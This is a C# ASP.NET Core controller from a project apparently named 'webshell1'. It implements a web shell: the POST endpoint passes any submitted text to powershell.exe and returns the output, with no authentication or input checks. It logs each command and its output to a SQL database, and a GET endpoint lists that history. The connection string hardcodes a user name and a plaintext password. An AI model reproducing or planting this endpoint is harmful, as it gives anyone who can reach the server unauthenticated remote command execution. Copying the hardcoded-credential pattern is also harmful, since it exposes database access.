using Microsoft.AspNetCore.Mvc;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;

namespace webshell1.Controllers
{
    [Route("[controller]")]
    [ApiController]
    public class CommandsController : Controller
    {
        string connectionString = "Server=(localdb)\\mssqllocaldb;Initial Catalog=TestDB;Persist Security Info=True;User ID=SomeUser;Password=Topsecret123;";
        [HttpGet]
        public  ActionResult<List<Command>> Index()
        {
            List<Command> commands = new List<Command>();
            string query = "SELECT * FROM [dbo].[Table];";
            using (SqlConnection connect = new SqlConnection(connectionString))
            {
                using (SqlCommand cmd = new SqlCommand(query, connect))
                {
                    connect.Open();
                    using (SqlDataReader reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            Command command = new Command();
                            command.Id = (int)reader["Id"];
                            command.Input = (string)reader["Input"];
                            command.Output = (string)reader["Output"];
                            commands.Add(command);
                        }
                    }
                }
            }
            return commands;
        }
        [HttpPost]
        public ActionResult<Command> PostCommand([FromBody] string input) 
        {
            string output = Execute(input);
            Command command = new Command { Input = input, Output = output };
            using (SqlConnection connect = new SqlConnection(connectionString))
            {
                using (SqlCommand cmd = new SqlCommand("Procedure1", connect))
                {
                    cmd.CommandType = System.Data.CommandType.StoredProcedure;
                    SqlParameter paramInput = new SqlParameter
                    {
                        ParameterName = "@Input",
                        SqlDbType = System.Data.SqlDbType.NVarChar,
                        Value = input
                    };
                    SqlParameter paramOutput = new SqlParameter
                    {
                        ParameterName = "@Output",
                        SqlDbType = System.Data.SqlDbType.NVarChar,
                        Value = output
                    };
                    SqlParameter paramId = new SqlParameter
                    {
                        ParameterName = "@Id",
                        SqlDbType = System.Data.SqlDbType.Int,
                        Direction = System.Data.ParameterDirection.Output,
                    };
                    cmd.Parameters.Add(paramInput);
                    cmd.Parameters.Add(paramOutput);
                    cmd.Parameters.Add(paramId);
                    connect.Open();
                    cmd.ExecuteNonQuery();
                    command.Id = (int)cmd.Parameters["@Id"].Value;
                    cmd.Parameters.Clear();
                }
            }
            //string query = "INSERT INTO [dbo].[Table] (Id, Input, Output) Values(@Id, @Input, @Output)";
            //cmd.Parameters.AddWithValue("@Input", input);
            //cmd.Parameters.AddWithValue("@Output", output);
            return CreatedAtAction("Index", command);
        }
        private string Execute(string input)
        {
            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = input;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.Start();
            StreamReader outputReader = process.StandardOutput;
            StreamReader errorReader = process.StandardError;
            string output = string.Concat(outputReader.ReadToEnd(), errorReader.ReadToEnd());
            process.WaitForExit();
            return output;
        }
        }
    }

